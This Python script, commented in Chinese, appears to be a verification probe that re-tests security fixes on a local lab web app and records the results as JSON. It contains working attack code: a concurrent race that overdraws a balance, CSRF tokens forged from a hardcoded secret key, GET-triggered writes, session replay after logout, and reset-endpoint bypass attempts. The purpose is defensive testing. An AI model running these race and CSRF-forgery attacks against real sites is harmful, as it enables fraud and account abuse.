#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
t3 独立验证探针（自写，不复用 hunter 任何脚本）
目标：对 t2 的 A1/A2/A3/A4/A6 五处加固做复打，判定有效性与绕过路径。

目标范围（硬约束）：
  - 127.0.0.1:18095  原件对照沙箱（app.py.loop1-original，sha256 D2992CD0…）
  - 127.0.0.1:18096  加固件沙箱（target-site-lab/app.py 副本，sha256 870F28B3…）
  - 127.0.0.1:8095   真实加固靶场（只做非破坏性探测）
绝不触碰 8095 的 /__reset（配额已用尽，队长明令）。

用法: python loop2-verify-probe.py [--phase A1|A2|A3|A4|A6|real|all]
"""
import hashlib
import hmac
import http.client
import json
import os
import socket
import sqlite3
import sys
import threading
import time

HERE = os.path.dirname(os.path.abspath(__file__))
WS = os.path.abspath(os.path.join(HERE, "..", "..", ".."))
SB = os.path.join(HERE, "loop2-verify-sandbox")
ORIG_DB = os.path.join(SB, "orig", "lab.db")
HARD_DB = os.path.join(SB, "hard", "lab.db")
REAL_DB = os.path.join(WS, "target-site-lab", "lab.db")
SECRET_KEY = "lab-secret-key-PLEASE-CHANGE-001"  # 源码常量，原件/加固件一致

TS = time.strftime("%Y%m%d-%H%M%S")
RECORDS = []


# --------------------------------------------------------------------------- #
# HTTP 原语（自写，http.client）
# --------------------------------------------------------------------------- #
def req(port, method, path, body=None, cookie=None, headers=None, host="127.0.0.1",
        timeout=20, record=True, tag=""):
    h = {"User-Agent": "lv-probe/1.0"}
    if headers:
        h.update(headers)
    if cookie:
        h["Cookie"] = "token=%s" % cookie
    if body is not None and "Content-Type" not in h:
        h["Content-Type"] = "application/x-www-form-urlencoded"
    try:
        conn = http.client.HTTPConnection(host, port, timeout=timeout)
        conn.request(method, path, body=body, headers=h)
        r = conn.getresponse()
        raw = r.read()
        status = r.status
        setc = r.getheader("Set-Cookie") or ""
        conn.close()
    except Exception as exc:  # 连接层异常也要留证
        status, raw, setc = -1, ("EXC: %r" % (exc,)).encode(), ""
    text = raw.decode("utf-8", "replace")
    if record:
        RECORDS.append({
            "tag": tag, "port": port, "method": method, "path": path,
            "req_headers": {k: v for k, v in h.items() if k != "Cookie"},
            "req_body": body, "cookie_present": bool(cookie),
            "status": status, "resp_len": len(raw),
            "set_cookie": setc[:120],
            "resp_snippet": text[:400].replace("\n", " "),
        })
    return status, text, setc


def login(port, user, pw, tag=""):
    st, body, setc = req(port, "POST", "/login", "username=%s&password=%s" % (user, pw),
                         tag=tag or ("login-%s" % user))
    tok = ""
    for part in setc.split(";"):
        part = part.strip()
        if part.startswith("token="):
            tok = part[len("token="):]
    return st, tok


def db_state(dbfile):
    """直查数据库取前后值（只读 URI，避免干扰服务端）。"""
    c = sqlite3.connect("file:%s?mode=ro" % dbfile.replace("\\", "/"), uri=True)
    try:
        users = {r[0]: r[1] for r in c.execute("SELECT username,balance_cents FROM users")}
        orders = c.execute("SELECT COUNT(*) FROM orders").fetchone()[0]
        orders_by_user = {r[0]: r[1] for r in
                          c.execute("SELECT user_id,COUNT(*) FROM orders GROUP BY user_id")}
        sessions = c.execute("SELECT COUNT(*) FROM sessions").fetchone()[0]
        cols = {r[1] for r in c.execute("PRAGMA table_info(sessions)")}
        if "csrf_token" in cols:
            sess_rows = [tuple(r) for r in c.execute(
                "SELECT token,user_id,username,csrf_token FROM sessions")]
        else:  # 加固前 schema 无该列
            sess_rows = [tuple(r) + (None,) for r in c.execute(
                "SELECT token,user_id,username FROM sessions")]
        return {"balances": users, "orders_total": orders,
                "orders_by_user": orders_by_user, "sessions": sessions,
                "session_rows": sess_rows, "sessions_cols": sorted(cols)}
    finally:
        c.close()


def db_exec(dbfile, sql, params=()):
    """仅用于我方沙箱克隆的取证性改写（不用于 8095）。"""
    c = sqlite3.connect(dbfile)
    try:
        cur = c.execute(sql, params)
        c.commit()
        return cur.rowcount
    finally:
        c.close()


def fstat(path):
    try:
        st = os.stat(path)
        with open(path, "rb") as fh:
            sha = hashlib.sha256(fh.read()).hexdigest()
        return {"size": st.st_size, "mtime": st.st_mtime,
                "mtime_str": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(st.st_mtime)),
                "sha256": sha}
    except FileNotFoundError:
        return {"size": None, "mtime": None, "mtime_str": None, "sha256": None}


def race(port, cookie, n, path, payload_fn, extra_headers=None):
    """n 线程 + Barrier 同时发射，最大化竞态窗口。"""
    out = []
    lock = threading.Lock()
    barrier = threading.Barrier(n)

    def worker(i):
        try:
            barrier.wait(timeout=15)
        except Exception:
            pass
        st, body, _ = req(port, "POST", path, payload_fn(i), cookie=cookie,
                          headers=extra_headers, record=False, tag="race")
        with lock:
            out.append((i, st, body[:200]))

    ts = [threading.Thread(target=worker, args=(i,)) for i in range(n)]
    for t in ts:
        t.start()
    for t in ts:
        t.join()
    return sorted(out)


def csrf_of(dbfile, token):
    c = sqlite3.connect("file:%s?mode=ro" % dbfile.replace("\\", "/"), uri=True)
    try:
        cols = {r[1] for r in c.execute("PRAGMA table_info(sessions)")}
        if "csrf_token" not in cols:
            return None  # 加固前 schema：token 由 HMAC 派生，库里不存
        row = c.execute("SELECT csrf_token FROM sessions WHERE token=?", (token,)).fetchone()
        return row[0] if row else None
    finally:
        c.close()


def hmac_guess(session_token):
    return hmac.new(SECRET_KEY.encode(), session_token.encode(), hashlib.sha256).hexdigest()


def note(container, key, value):
    container.setdefault(key, []).append(value)


# --------------------------------------------------------------------------- #
# A1 —— 并发下单 TOCTOU
# --------------------------------------------------------------------------- #
def phase_a1():
    res = {"fix": "A1", "title": "/order/create 条件更新（原子扣款）", "rounds": []}
    N = 30
    for target, port, dbfile, use_csrf in (("orig", 18095, ORIG_DB, False),
                                           ("hard", 18096, HARD_DB, True)):
        for rnd in range(1, 4):
            # 复位到干净态
            if target == "orig":
                req(port, "GET", "/__reset", tag="a1-reset-orig")
            else:
                req(port, "POST", "/__reset", "confirm=RESET", tag="a1-reset-hard")
            st, tok = login(port, "demo", "demo123", tag="a1-login-%s" % target)
            csrf = csrf_of(dbfile, tok) if use_csrf else ""
            before = db_state(dbfile)
            payloads = []
            if use_csrf:
                payloads = ["csrf_token=%s&product_id=1&qty=1" % csrf] * N
            else:
                payloads = ["product_id=1&qty=1"] * N
            t0 = time.time()
            rows = race(port, tok, N, "/order/create", lambda i: payloads[i])
            dt = time.time() - t0
            after = db_state(dbfile)
            codes = {}
            for _, st_, _ in rows:
                codes[st_] = codes.get(st_, 0) + 1
            delta_orders = after["orders_total"] - before["orders_total"]
            bal_before = before["balances"]["demo"]
            bal_after = after["balances"]["demo"]
            limit = bal_before // 29900
            res["rounds"].append({
                "target": target, "round": rnd, "concurrency": N,
                "status_counts": codes, "elapsed_s": round(dt, 3),
                "db_before": {"demo_balance": bal_before, "orders_total": before["orders_total"]},
                "db_after": {"demo_balance": bal_after, "orders_total": after["orders_total"]},
                "orders_created": delta_orders,
                "balance_negative": bal_after < 0,
                "orders_within_limit": delta_orders <= limit,
                "orders_limit_expected": limit,
                "raw": rows,
            })
    res["verdict"] = {
        "orig_negative_rounds": [r["round"] for r in res["rounds"]
                                 if r["target"] == "orig" and r["balance_negative"]],
        "hard_negative_rounds": [r["round"] for r in res["rounds"]
                                 if r["target"] == "hard" and r["balance_negative"]],
        "hard_overlimit_rounds": [r["round"] for r in res["rounds"]
                                  if r["target"] == "hard" and not r["orders_within_limit"]],
    }
    return res


# --------------------------------------------------------------------------- #
# A2 —— 四写入口方法/CSRF 门禁
# --------------------------------------------------------------------------- #
ENTRIES = [
    ("order_create", "/order/create", "product_id=1&qty=1"),
    ("order_status", "/order/status", "order_id=2&state=paid"),
    ("coupon_claim", "/coupon/claim", "code=WELCOME10"),
    ("wallet_withdraw", "/wallet/withdraw", "amount=100"),
]


def phase_a2():
    res = {"fix": "A2", "title": "四写入口：仅 POST + CSRF token", "matrix": []}
    for target, port, dbfile, use_csrf in (("orig", 18095, ORIG_DB, False),
                                           ("hard", 18096, HARD_DB, True)):
        for rnd in range(1, 2):
            if target == "orig":
                req(port, "GET", "/__reset", tag="a2-reset-orig")
            else:
                req(port, "POST", "/__reset", "confirm=RESET", tag="a2-reset-hard")
            _, tok = login(port, "alice", "alice123", tag="a2-login-%s" % target)
            csrf = csrf_of(dbfile, tok) or ""
            for name, path, body in ENTRIES:
                b0 = db_state(dbfile)
                cases = []
                # 1) 顶级 GET（爬虫/链接/图片标签式触发）
                st, txt, _ = req(port, "GET", path + "?" + body, cookie=tok,
                                 tag="a2-%s-%s-GET" % (target, name))
                cases.append(("top-level GET", "GET " + path + "?" + body, st,
                              db_state(dbfile) != b0))
                # 2) POST 无 token
                b1 = db_state(dbfile)
                st, txt, _ = req(port, "POST", path, body, cookie=tok,
                                 tag="a2-%s-%s-notoken" % (target, name))
                cases.append(("POST no token", "POST " + path + " " + body, st,
                              db_state(dbfile) != b1))
                # 3) POST 错 token
                b2 = db_state(dbfile)
                st, txt, _ = req(port, "POST", path, "csrf_token=deadbeef&" + body,
                                 cookie=tok, tag="a2-%s-%s-badtoken" % (target, name))
                cases.append(("POST wrong token", "POST " + path + " csrf_token=deadbeef", st,
                              db_state(dbfile) != b2))
                # 4) POST 正确 token
                b3 = db_state(dbfile)
                st, txt, _ = req(port, "POST", path, "csrf_token=%s&%s" % (csrf, body),
                                 cookie=tok, tag="a2-%s-%s-goodtoken" % (target, name))
                cases.append(("POST correct token", "POST " + path + " csrf_token=<valid>", st,
                              db_state(dbfile) != b3))
                res["matrix"].append({
                    "target": target, "entry": name, "path": path,
                    "cases": [{"case": c[0], "request": c[1], "status": c[2],
                               "db_changed": c[3]} for c in cases],
                })
    return res


# --------------------------------------------------------------------------- #
# A3 —— CSRF token 不可由 HMAC 推导
# --------------------------------------------------------------------------- #
def phase_a3():
    res = {"fix": "A3", "title": "csrf_token 改为服务端随机值（非 HMAC 派生）", "checks": []}
    for target, port, dbfile in (("orig", 18095, ORIG_DB), ("hard", 18096, HARD_DB)):
        if target == "orig":
            req(port, "GET", "/__reset", tag="a3-reset-orig")
        else:
            req(port, "POST", "/__reset", "confirm=RESET", tag="a3-reset-hard")
        _, tok = login(port, "alice", "alice123", tag="a3-login-%s" % target)
        st, home, _ = req(port, "GET", "/home", cookie=tok, tag="a3-home-%s" % target)
        page_tok = ""
        marker = 'name="csrf_token" value="'
        if marker in home:
            page_tok = home.split(marker, 1)[1].split('"', 1)[0]
        guess = hmac_guess(tok)
        stored = csrf_of(dbfile, tok)
        res["checks"].append({
            "target": target, "session_token": tok,
            "page_token": page_tok, "page_token_len": len(page_tok),
            "hmac_guess": guess, "hmac_len": len(guess),
            "db_stored": stored,
            "page_equals_hmac": page_tok == guess,
            "db_equals_page": (stored or "") == page_tok,
            "page_token_charset": "urlsafe" if all(
                ch.isalnum() or ch in "-_" for ch in page_tok) else "hex/other",
        })
    # 跨会话 token 复用（hard 沙箱内两个会话）
    port, dbfile = 18096, HARD_DB
    req(port, "POST", "/__reset", "confirm=RESET", tag="a3-reset-hard2")
    _, tok_a = login(port, "alice", "alice123", tag="a3-login-alice")
    _, tok_b = login(port, "bob", "bob123", tag="a3-login-bob")
    csrf_b = csrf_of(dbfile, tok_b)
    st, txt, _ = req(port, "POST", "/wallet/withdraw", "csrf_token=%s&amount=100" % csrf_b,
                     cookie=tok_a, tag="a3-cross-session")
    res["cross_session"] = {"alice_token_used_with": "bob_csrf", "status": st,
                            "bob_csrf": csrf_b}
    # NULL 兜底路径（模拟老会话行）
    db_exec(dbfile, "UPDATE sessions SET csrf_token=NULL WHERE token=?", (tok_a,))
    st, home2, _ = req(port, "GET", "/home", cookie=tok_a, tag="a3-null-fallback-page")
    new_page = ""
    if marker in home2:
        new_page = home2.split(marker, 1)[1].split('"', 1)[0]
    stored_after = csrf_of(dbfile, tok_a)
    st_w, _, _ = req(port, "POST", "/wallet/withdraw",
                     "csrf_token=%s&amount=1" % new_page, cookie=tok_a,
                     tag="a3-null-fallback-write")
    res["null_fallback"] = {"page_token_after": new_page, "db_after": stored_after,
                            "db_equals_page": new_page == stored_after,
                            "write_status": st_w}
    return res


# --------------------------------------------------------------------------- #
# A4 —— 登出销毁服务端会话
# --------------------------------------------------------------------------- #
def phase_a4():
    res = {"fix": "A4", "title": "logout 删除 sessions 行", "checks": []}
    for target, port, dbfile in (("orig", 18095, ORIG_DB), ("hard", 18096, HARD_DB)):
        if target == "orig":
            req(port, "GET", "/__reset", tag="a4-reset-orig")
        else:
            req(port, "POST", "/__reset", "confirm=RESET", tag="a4-reset-hard")
        _, tok = login(port, "alice", "alice123", tag="a4-login-%s" % target)
        csrf = csrf_of(dbfile, tok) or ""
        before = db_state(dbfile)
        req(port, "GET", "/logout", cookie=tok, tag="a4-logout-%s" % target)
        after = db_state(dbfile)
        st_home, txt_home, _ = req(port, "GET", "/home", cookie=tok,
                                   tag="a4-replay-home-%s" % target)
        st_w, txt_w, _ = req(port, "POST", "/wallet/withdraw",
                             "csrf_token=%s&amount=100" % csrf, cookie=tok,
                             tag="a4-replay-write-%s" % target)
        st_admin, _, _ = req(port, "GET", "/admin/users", cookie=tok,
                             tag="a4-replay-admin-%s" % target)
        res["checks"].append({
            "target": target, "session_token": tok,
            "sessions_before": before["sessions"], "sessions_after": after["sessions"],
            "row_gone": all(r[0] != tok for r in after["session_rows"]),
            "replay_home_status": st_home, "replay_write_status": st_w,
            "replay_admin_status": st_admin,
            "home_snippet": txt_home[:120].replace("\n", " "),
        })
    # 交叉验证：登出只删自己那一行
    port, dbfile = 18096, HARD_DB
    req(port, "POST", "/__reset", "confirm=RESET", tag="a4-reset-hard2")
    _, tok_a = login(port, "alice", "alice123", tag="a4-login-alice2")
    _, tok_b = login(port, "bob", "bob123", tag="a4-login-bob2")
    b0 = db_state(dbfile)
    req(port, "GET", "/logout", cookie=tok_a, tag="a4-logout-alice-only")
    b1 = db_state(dbfile)
    st_b, _, _ = req(port, "GET", "/home", cookie=tok_b, tag="a4-bob-still-alive")
    res["scope_check"] = {"sessions_before": b0["sessions"], "sessions_after": b1["sessions"],
                          "bob_home_status": st_b,
                          "bob_token_still_valid": any(r[0] == tok_b for r in b1["session_rows"])}
    return res


# --------------------------------------------------------------------------- #
# A6 —— /__reset 方法/来源/二次确认
# --------------------------------------------------------------------------- #
def phase_a6():
    res = {"fix": "A6", "title": "/__reset 四层加固（回环/仅POST/confirm/审计）", "checks": []}
    for target, port, dbfile in (("orig", 18095, ORIG_DB), ("hard", 18096, HARD_DB)):
        if target == "orig":
            req(port, "GET", "/__reset", tag="a6-pre-reset-orig")
        else:
            req(port, "POST", "/__reset", "confirm=RESET", tag="a6-pre-reset-hard")
        cases = []

        def probe(label, method, path, body=None, headers=None, host="127.0.0.1",
                  cookie=None):
            f0 = fstat(dbfile)
            st, txt, _ = req(port, method, path, body, cookie=cookie, headers=headers,
                             host=host, tag="a6-%s-%s" % (target, label))
            time.sleep(0.25)
            f1 = fstat(dbfile)
            cases.append({
                "case": label, "request": "%s %s" % (method, path),
                "status": st,
                "db_mtime_before": f0["mtime_str"], "db_mtime_after": f1["mtime_str"],
                "db_sha_before": f0["sha256"][:16], "db_sha_after": f1["sha256"][:16],
                "db_changed": (f0["mtime"] != f1["mtime"] or f0["sha256"] != f1["sha256"]),
                "resp_snippet": txt[:160].replace("\n", " "),
            })

        probe("HEAD", "HEAD", "/__reset")
        probe("GET", "GET", "/__reset")
        probe("GET-crawler-ua", "GET", "/__reset",
              headers={"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1)",
                       "Referer": "http://127.0.0.1:%d/" % port})
        probe("GET-img-tag", "GET", "/__reset",
              headers={"Accept": "image/avif,image/webp,*/*", "Sec-Fetch-Dest": "image",
                       "Sec-Fetch-Mode": "no-cors", "Sec-Fetch-Site": "cross-site"})
        probe("POST-no-confirm", "POST", "/__reset", "foo=bar")
        probe("POST-empty-body", "POST", "/__reset", "")
        probe("POST-json-confirm", "POST", "/__reset", '{"confirm":"RESET"}',
              headers={"Content-Type": "application/json"})
        probe("POST-confirm-query", "POST", "/__reset?confirm=RESET", "")
        probe("POST-confirm-body", "POST", "/__reset", "confirm=RESET")
        probe("POST-confirm-body-crosssite", "POST", "/__reset", "confirm=RESET",
              headers={"Origin": "http://evil.example",
                       "Referer": "http://evil.example/x.html"})
        probe("PUT", "PUT", "/__reset", "confirm=RESET")
        probe("GET-path-doubleslash", "GET", "//__reset")
        probe("GET-path-encoded", "GET", "/%5f%5freset")
        probe("GET-path-slash", "GET", "/__reset/")
        # 非回环源地址（绑定 127.0.0.2 作为源 IP 真发请求）
        f0 = fstat(dbfile)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind(("127.0.0.2", 0))
            s.settimeout(8)
            s.connect(("127.0.0.1", port))
            payload = ("POST /__reset HTTP/1.1\r\nHost: 127.0.0.1:%d\r\n"
                       "Content-Type: application/x-www-form-urlencoded\r\n"
                       "Content-Length: 14\r\nConnection: close\r\n\r\nconfirm=RESET" % port)
            s.sendall(payload.encode())
            raw = b""
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                raw += chunk
            s.close()
            status_line = raw.split(b"\r\n", 1)[0].decode("utf-8", "replace")
            peer_status = int(status_line.split()[1]) if len(status_line.split()) > 1 else -1
            peer_note = "bound source 127.0.0.2 -> %s" % status_line
        except Exception as exc:
            peer_status, peer_note = -1, "bind/connect failed: %r" % (exc,)
        time.sleep(0.25)
        f1 = fstat(dbfile)
        cases.append({"case": "POST-confirm-from-127.0.0.2", "request": "POST /__reset (src 127.0.0.2)",
                      "status": peer_status, "note": peer_note,
                      "db_mtime_before": f0["mtime_str"], "db_mtime_after": f1["mtime_str"],
                      "db_changed": f0["mtime"] != f1["mtime"] or f0["sha256"] != f1["sha256"],
                      "resp_snippet": peer_note[:160]})
        res["checks"].append({"target": target, "cases": cases})
    # 审计日志
    audit = os.path.join(SB, "hard", "reset-audit.log")
    res["audit_log"] = {"path": audit, "lines": open(audit, encoding="utf-8").read().splitlines()
                        if os.path.exists(audit) else []}
    return res


# --------------------------------------------------------------------------- #
# 真实 8095：非破坏性探测
# --------------------------------------------------------------------------- #
def phase_real():
    res = {"target": "127.0.0.1:8095", "note": "真实加固靶场；全部为非破坏性载荷，未打 /__reset",
           "checks": {}}
    st, tok = login(8095, "bob", "bob123", tag="real-login-bob")
    res["checks"]["login_status"] = st
    st, home, _ = req(8095, "GET", "/home", cookie=tok, tag="real-home")
    page_tok = ""
    marker = 'name="csrf_token" value="'
    if marker in home:
        page_tok = home.split(marker, 1)[1].split('"', 1)[0]
    guess = hmac_guess(tok)
    res["checks"]["a3"] = {
        "page_token": page_tok, "hmac_guess": guess,
        "page_equals_hmac": page_tok == guess,
        "db_stored": csrf_of(REAL_DB, tok),
        "db_equals_page": (csrf_of(REAL_DB, tok) or "") == page_tok,
    }
    # A2 四入口矩阵（载荷全部设计为不改变状态：余额不足/不存在/无效）
    safe = {
        "order_create": "product_id=1&qty=1",           # bob 100 分 vs 29900 分 -> 余额不足
        "order_status": "order_id=999999&state=paid",   # 订单不存在
        "coupon_claim": "code=NOPE-CODE",               # 券不存在
        "wallet_withdraw": "amount=999999999",          # 余额不足（rowcount=0，不落库）
    }
    matrix = []
    for name, body in safe.items():
        path = "/" + name.replace("_", "/") if name != "order_create" else "/order/create"
        path = {"order_create": "/order/create", "order_status": "/order/status",
                "coupon_claim": "/coupon/claim", "wallet_withdraw": "/wallet/withdraw"}[name]
        b0 = db_state(REAL_DB)
        st_g, _, _ = req(8095, "GET", path + "?" + body, cookie=tok, tag="real-%s-GET" % name)
        st_n, _, _ = req(8095, "POST", path, body, cookie=tok, tag="real-%s-notoken" % name)
        st_b, _, _ = req(8095, "POST", path, "csrf_token=deadbeef&" + body, cookie=tok,
                         tag="real-%s-badtoken" % name)
        st_ok, txt_ok, _ = req(8095, "POST", path, "csrf_token=%s&%s" % (page_tok, body),
                               cookie=tok, tag="real-%s-goodtoken" % name)
        b1 = db_state(REAL_DB)
        matrix.append({"entry": name, "path": path, "payload": body,
                       "GET": st_g, "POST_no_token": st_n, "POST_wrong_token": st_b,
                       "POST_correct_token": st_ok, "db_changed": b0 != b1,
                       "goodtoken_snippet": txt_ok[:160].replace("\n", " ")})
    res["checks"]["a2_matrix"] = matrix
    res["checks"]["db_before"] = db_state(REAL_DB)
    return res


# --------------------------------------------------------------------------- #
# 绕过相（B）—— 按 cybermes 技能清单（CSRF §10 / race §11 / hunt-session Pattern 3）
# --------------------------------------------------------------------------- #
def phase_bypass():
    res = {"fix": "B", "title": "绕过对抗：门禁覆盖不全 / GET 写 / token 位置 / 会话失效面",
           "checks": {}}
    port, dbfile = 18096, HARD_DB
    req(port, "POST", "/__reset", "confirm=RESET", tag="b-reset")
    _, tok = login(port, "alice", "alice123", tag="b-login-alice")
    csrf = csrf_of(dbfile, tok)

    # B1 顶级 GET 是否仍能改状态（A2 只覆盖了 4 个入口，其余写端点未接 check_write）
    b1 = []
    for name, path, body in (
            ("wallet_transfer", "/wallet/transfer", "to=bob&amount=7"),
            ("change_password", "/change-password", "new_password=zzz999"),
            ("board_post", "/board", "content=b-canary"),
            ("upload_post", "/upload", ""),
    ):
        before = db_state(dbfile)
        st, txt, _ = req(port, "GET", path + "?" + body + "&csrf_token=" + csrf,
                         cookie=tok, tag="b1-%s" % name)
        after = db_state(dbfile)
        changed = before != after
        detail = {"entry": name, "method": "GET", "path": path, "query": body,
                  "status": st, "db_changed": changed}
        if changed:
            detail["diff"] = {
                "balances_before": before["balances"], "balances_after": after["balances"],
                "orders_before": before["orders_total"], "orders_after": after["orders_total"],
            }
        b1.append(detail)
        if name == "change_password":  # 复位改密影响
            req(port, "POST", "/__reset", "confirm=RESET", tag="b1-restore")
            _, tok = login(port, "alice", "alice123", tag="b1-relogin")
            csrf = csrf_of(dbfile, tok)
    res["checks"]["b1_top_level_get_state_change"] = b1

    # B2 CSRF token 位置：query 是否被接受（form() 把 q 合并进 data）
    b2 = []
    for label, kwargs in (
            ("token_in_query", dict(path="/wallet/withdraw?amount=1&csrf_token=" + csrf, body=None)),
            ("token_in_body", dict(path="/wallet/withdraw", body="amount=1&csrf_token=" + csrf)),
            ("token_in_json_body", dict(path="/wallet/withdraw?amount=1&csrf_token=" + csrf,
                                        body='{"x":1}', headers={"Content-Type": "application/json"})),
            ("token_in_header_only", dict(path="/wallet/withdraw", body="amount=1",
                                          headers={"X-CSRF-Token": csrf})),
    ):
        st, txt, _ = req(port, "POST", kwargs["path"], kwargs.get("body"),
                         cookie=tok, headers=kwargs.get("headers"), tag="b2-%s" % label)
        b2.append({"case": label, "request": "POST " + kwargs["path"],
                   "body": kwargs.get("body"), "status": st,
                   "snippet": txt[:100].replace("\n", " ")})
    res["checks"]["b2_token_location"] = b2

    # B3 会话失效面：改密后旧会话是否仍有效（hunt-session Pattern 3）
    req(port, "POST", "/__reset", "confirm=RESET", tag="b3-reset")
    _, tok_v = login(port, "bob", "bob123", tag="b3-login-bob")
    csrf_v = csrf_of(dbfile, tok_v)
    st_pre, _, _ = req(port, "GET", "/home", cookie=tok_v, tag="b3-home-before-pwchange")
    st_pw, _, _ = req(port, "POST", "/change-password",
                      "csrf_token=%s&new_password=bob9999" % csrf_v, cookie=tok_v,
                      tag="b3-change-password")
    st_post, txt_post, _ = req(port, "GET", "/home", cookie=tok_v, tag="b3-home-after-pwchange")
    st_oldpw, _tok_old = login(port, "bob", "bob123", tag="b3-login-oldpw")
    st_newpw, tok_new = login(port, "bob", "bob9999", tag="b3-login-newpw")
    res["checks"]["b3_session_after_password_change"] = {
        "home_before": st_pre, "change_password": st_pw, "home_after": st_post,
        "sessions_row_still_present": any(r[0] == tok_v for r in db_state(dbfile)["session_rows"]),
        "login_with_old_password": st_oldpw, "login_with_new_password": st_newpw,
    }
    req(port, "POST", "/__reset", "confirm=RESET", tag="b3-restore")

    # B4 cookie 变体：大小写/尾随空白/编码能否命中同一会话行
    req(port, "POST", "/__reset", "confirm=RESET", tag="b4-reset")
    _, tok2 = login(port, "bob", "bob123", tag="b4-login-bob")
    variants = [("exact", tok2), ("upper", tok2.upper()), ("trailing_space", tok2 + "%20"),
                ("quoted", '"%s"' % tok2), ("urlencoded", tok2.replace("-", "%2D"))]
    b4 = []
    for label, val in variants:
        st, _, _ = req(port, "GET", "/home", cookie=val, tag="b4-%s" % label)
        b4.append({"variant": label, "cookie": val[:50], "status": st})
    res["checks"]["b4_cookie_variants"] = b4

    # B5 跨端点竞态：提现与下单同波并发（不同端点共享同一余额行）
    req(port, "POST", "/__reset", "confirm=RESET", tag="b5-reset")
    _, tokd = login(port, "demo", "demo123", tag="b5-login-demo")
    csrfd = csrf_of(dbfile, tokd)
    before = db_state(dbfile)
    barrier = threading.Barrier(20)
    out = []
    lock = threading.Lock()

    def w(i):
        try:
            barrier.wait(timeout=15)
        except Exception:
            pass
        if i % 2 == 0:
            st, _, _ = req(port, "POST", "/wallet/withdraw",
                           "csrf_token=%s&amount=29900" % csrfd, cookie=tokd,
                           record=False, tag="b5-withdraw")
        else:
            st, _, _ = req(port, "POST", "/order/create",
                           "csrf_token=%s&product_id=1&qty=1" % csrfd, cookie=tokd,
                           record=False, tag="b5-order")
        with lock:
            out.append((i, st))

    ths = [threading.Thread(target=w, args=(i,)) for i in range(20)]
    for t in ths:
        t.start()
    for t in ths:
        t.join()
    after = db_state(dbfile)
    sc = {}
    for _, s in out:
        sc[s] = sc.get(s, 0) + 1
    res["checks"]["b5_cross_endpoint_race"] = {
        "before_balance": before["balances"]["demo"], "after_balance": after["balances"]["demo"],
        "before_orders": before["orders_total"], "after_orders": after["orders_total"],
        "status_counts": sc,
        "balance_negative": after["balances"]["demo"] < 0,
        "raw": sorted(out),
    }
    req(port, "POST", "/__reset", "confirm=RESET", tag="b5-restore")
    return res


PHASES = {"A1": phase_a1, "A2": phase_a2, "A3": phase_a3, "A4": phase_a4,
          "A6": phase_a6, "B": phase_bypass, "real": phase_real}


def main():
    want = sys.argv[1] if len(sys.argv) > 1 else "all"
    if want == "all":
        order = ["A1", "A2", "A3", "A4", "B", "real", "A6"]  # A6 放最后（会复位沙箱）
    else:
        order = [want]
    out = {"meta": {"timestamp": TS, "probe": os.path.basename(__file__),
                    "secret_key_used": SECRET_KEY,
                    "sandbox": {"orig_port": 18095, "hard_port": 18096, "real_port": 8095},
                    "artifacts": {
                        "orig_app_sha256": hashlib.sha256(open(os.path.join(SB, "orig", "app.py"), "rb").read()).hexdigest(),
                        "hard_app_sha256": hashlib.sha256(open(os.path.join(SB, "hard", "app.py"), "rb").read()).hexdigest(),
                        "real_app_sha256": hashlib.sha256(open(os.path.join(WS, "target-site-lab", "app.py"), "rb").read()).hexdigest(),
                    }},
           "results": {}}
    for p in order:
        print("[*] phase %s ..." % p, flush=True)
        out["results"][p] = PHASES[p]()
        print("    done", flush=True)
    out["records"] = RECORDS
    path = os.path.join(HERE, "loop2-verify-%s.json" % TS)
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(out, fh, ensure_ascii=False, indent=2)
    print("[+] wrote %s" % path)
    print(json.dumps({k: (v.get("verdict") if isinstance(v, dict) else None)
                      for k, v in out["results"].items()}, ensure_ascii=False, indent=2))


if __name__ == "__main__":
    main()
